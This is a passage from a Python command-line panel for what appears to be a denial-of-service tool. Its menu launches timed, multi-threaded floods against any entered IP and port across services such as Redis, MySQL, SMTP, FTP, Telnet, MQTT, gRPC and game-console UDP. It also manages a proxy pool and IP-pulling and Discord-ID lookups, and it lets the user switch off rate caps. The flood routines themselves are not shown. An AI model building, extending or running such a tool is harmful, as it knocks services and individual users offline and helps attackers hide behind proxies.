                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
                self.run_attack("L6-GRPC", m.l6_flood, t, p, d, c, "grpc")
            elif choice=="64":
                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [1883]:{C.END} ") or 1883)
                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
                self.run_attack("L6-MQTT", m.l6_flood, t, p, d, c, "mqtt")
            elif choice=="65":
                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [6379]:{C.END} ") or 6379)
                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
                self.run_attack("L6-REDIS", m.l6_flood, t, p, d, c, "redis")
            elif choice=="66":
                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [3306]:{C.END} ") or 3306)
                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
                self.run_attack("L6-MYSQL", m.l6_flood, t, p, d, c, "mysql")
            elif choice=="67":
                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [25]:{C.END} ") or 25)
                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [30]:{C.END} ") or 30)
                self.run_attack("L6-SMTP", m.l6_flood, t, p, d, c, "smtp")
            elif choice=="68":
                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [21]:{C.END} ") or 21)
                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [30]:{C.END} ") or 30)
                self.run_attack("L6-FTP", m.l6_flood, t, p, d, c, "ftp")
            elif choice=="69":
                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [23]:{C.END} ") or 23)
                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [30]:{C.END} ") or 30)
                self.run_attack("L6-TELNET", m.l6_flood, t, p, d, c, "telnet")
            elif choice=="70":
                self.tools_ip_pull()
            elif choice=="71":
                self.tools_batch_resolve()
            elif choice=="72":
                self.tools_discord_id()
            elif choice=="73":
                self._ask_udp("IPv4","ipv4")
            elif choice=="74":
                raw=input(f"  {C.Y}IPv6 or host:{C.END} ").strip()
                port=int(input(f"  {C.Y}Port [80]:{C.END} ") or 80)
                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
                pps=int(input(f"  {C.Y}PPS [100]:{C.END} ") or 100)
                self.run_attack("IPv6", self.methods.udp_flood, raw, port, d, pps, "ipv6")
            elif choice=="75":
                self._ask_udp("CONSOLE","console",3074)
            elif choice=="79":
                self._ask_udp("CONSOLE-UDP","console",3074)
            elif choice=="76":
                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [80]:{C.END} ") or 80)
                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
                self.run_attack("L6-MIX", m.l6_flood, t, p, d, c, "mix")
            elif choice=="90":
                self.pool.fetch(); input(f"{C.D}Enter...{C.END}")
            elif choice=="93":
                print()
                print("  Proxies total:", f"{len(self.pool.proxies):,}")
                print("  Live working :", f"{len(self.pool.working):,}")
                if self.pool.working:
                    print("  Sample live :", ", ".join(self.pool.working[:5]))
                input(f"{C.D}Enter...{C.END}")
            elif choice=="94":
                self.pool.validate(100); input(f"{C.D}Enter...{C.END}")
            elif choice=="95":
                print("  [*] Detecting public IP (max 3s)...")
                try:
                    self.public_ip, self.lan_ip = self._detect_public_ip()
                except Exception:
                    self.public_ip, self.lan_ip = None, None
                print("  Public IP ->", self.public_ip or "unknown (skipped/timeout)")
                print("  LAN IP    ->", self.lan_ip or "-")
                if self.public_ip:
                    self.safety.register_public(self.public_ip)
                    print("  WAN registered — cannot target yourself")
                input(f"{C.D}Enter...{C.END}")
            elif choice=="91":
                print(f"\n{C.BOLD} History{C.END}")
                for h in self.history[-15:]:
                    print(f"  {h['time']}  {h['method']:<12} {h['target'][:28]:<28} sent={h['sent']:,}")
                if not self.history: print(f"  {C.D}Empty{C.END}")
                input(f"{C.D}Enter...{C.END}")
            elif choice=="97":
                print()
                print(f"  {C.BOLD}THEME / COLORS{C.END}")
                keys = list(THEMES.keys())
                for i,k in enumerate(keys):
                    mark = "←" if k == ACTIVE_THEME[0] else " "
                    print(f"  [{i+1}] {THEMES[k]['name']:<10} {mark}")
                print(f"  [0] Back")
                sub = input(f"  {C.Y}choice:{C.END} ").strip()
                if sub.isdigit() and 1 <= int(sub) <= len(keys):
                    apply_theme(keys[int(sub)-1])
                    clear()
                    print(get_banner())
                    print(f"  {C.G}theme applied → {THEMES[ACTIVE_THEME[0]]['name']}{C.END}")
                    print(f"  {C.ASH}menu + banner + accents now use this palette{C.END}")
                input(f"{C.D}Enter...{C.END}")
            elif choice=="96":
                print(f"\n  {C.BOLD}ROUTER SHIELD{C.END}")
                print(f"  Status : {'ON — home/LAN/gateway blocked' if self.safety.router_shield else 'OFF — can target anything (can knock you offline)'}")
                print(f"  [1] Force ON   (safe — will not aim at your network)")
                print(f"  [2] Force OFF  (unsafe — your choice)")
                print(f"  [0] Back")
                sub = input(f"  {C.Y}choice:{C.END} ").strip()
                if sub == "1":
                    self.safety.router_shield = True
                    print(f"  {C.G}Router shield ON{C.END}")
                elif sub == "2":
                    conf = input(f"  {C.R}Type OFF to confirm:{C.END} ").strip()
                    if conf.upper() == "OFF":
                        self.safety.router_shield = False
                        print(f"  {C.R}Router shield OFF — do not target yourself{C.END}")
                    else:
                        print(f"  {C.ASH}cancelled{C.END}")
                input(f"{C.D}Enter...{C.END}")
            elif choice=="92":
                print(f"\n  {C.BOLD}SOFT AREA CONTROL{C.END}")
                print(f"  Status : {'ON (capped)' if self.safety.soft_mode else 'OFF (uncapped)'}")
                print(f"  Caps   : UDP≤{self.safety.SOFT_MAX_PPS} pps | HTTP≤{self.safety.SOFT_MAX_HTTP} | TCP≤{self.safety.SOFT_MAX_TCP}")
                print(f"  [1] Force OFF  (uncapped)")
                print(f"  [2] Force ON   (safe caps)")
                print(f"  [3] Raise caps (soft stays ON)")
                print(f"  [0] Back")
                sub = input(f"  {C.Y}choice:{C.END} ").strip()
                if sub == "1":
                    print(f"  {C.Y}WARNING: soft OFF can still lag your PC/router{C.END}")
                    print(f"  {C.Y}Hard ceilings remain (PPS≤{self.safety.HARD_PPS}) so you stay online{C.END}")
                    conf=input(f"  Type OFF to confirm: ").strip()
                    if conf.upper()=="OFF":
                        self.safety.soft_mode = False
                        print(f"  {C.R}Soft area OFF — hard ceilings still active{C.END}")
                    else:
                        print(f"  {C.ASH}cancelled — soft stays ON{C.END}")
                elif sub == "2":
                    self.safety.soft_mode = True
                    print(f"  {C.G}Soft area ON — caps active{C.END}")
                elif sub == "3":
                    self.safety.soft_mode = True
                    try:
                        self.safety.SOFT_MAX_PPS = max(1, int(input(f"  UDP pps max [{self.safety.SOFT_MAX_PPS}]: ") or self.safety.SOFT_MAX_PPS))
                        self.safety.SOFT_MAX_HTTP = int(input(f"  HTTP workers [{self.safety.SOFT_MAX_HTTP}]: ") or self.safety.SOFT_MAX_HTTP)
                        self.safety.SOFT_MAX_TCP = int(input(f"  TCP threads [{self.safety.SOFT_MAX_TCP}]: ") or self.safety.SOFT_MAX_TCP)
                        self.safety.SOFT_MAX_UDP_TH = min(120, max(8, self.safety.SOFT_MAX_PPS // 40))
                        print(f"  {C.G}Caps updated{C.END}")
                    except Exception:
                        print(f"  {C.R}Invalid number{C.END}")
                input(f"{C.D}Enter...{C.END}")
            else:
                print(f"{C.R}  Invalid{C.END}"); time.sleep(0.3)

if __name__=="__main__":
    try: Panel().start()
    except KeyboardInterrupt:
        print(f"\n{C.D}Interrupted.{C.END}"); sys.exit(0)
